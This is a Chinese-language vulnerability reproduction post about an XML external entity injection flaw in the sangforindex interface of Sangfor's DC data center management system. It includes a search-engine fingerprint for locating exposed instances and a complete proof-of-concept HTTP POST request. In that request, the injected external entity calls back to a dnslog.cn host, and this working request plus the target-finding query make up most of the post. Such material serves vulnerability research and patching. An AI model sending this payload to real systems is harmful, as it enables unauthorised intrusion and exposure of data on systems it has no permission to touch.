---
title: "深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞"
date: 2026-10-16 09:10:59
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "XXE"
  - "漏洞复现"
---
## 漏洞描述

深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入

## 漏洞影响

深信服 DC数据中心管理系统

## 网络测绘

```
"SANGFOR 数据中心"
```

## 漏洞复现

登陆页面

![image-20230828143259744](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828143259744.png)

验证POC

```
POST /src/sangforindex HTTP/1.1
Host: 
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE root [
    <!ENTITY rootas SYSTEM "http://xgsg1k.dnslog.cn">
]>
<xxx>
&rootas;
</xxx>
```

![image-20230828143318826](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828143318826.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-DC%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
